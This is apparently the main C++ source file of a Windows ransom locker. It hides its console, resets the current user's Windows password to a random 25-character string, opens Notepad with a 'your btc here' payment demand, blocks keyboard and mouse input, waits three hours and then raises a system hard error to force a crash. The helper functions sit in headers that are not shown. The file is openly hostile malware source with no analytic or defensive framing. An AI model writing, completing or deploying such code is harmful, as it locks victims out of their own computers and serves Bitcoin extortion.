#include <iostream>
#include <windows.h>

#include "utils.h"
#include "strenc.h"
#include "win32.h"
#include "nt.h"

int main ( ) {

	string user_name = g_utils.get_user_name();

	g_utils.rename_builder();
	g_win32.show_window(g_win32.get_console_window(), 0);
	g_utils.set_password_windows(user_name, g_utils.random_string(25));
	g_utils.show_notepad(user_name, "your btc here");
	g_win32.block_input(1);
	g_win32.sleeping_mode(10800000);
	g_nt.jmp_raise(19, ((DWORD)0xC00002B4L));

	return status_success;
}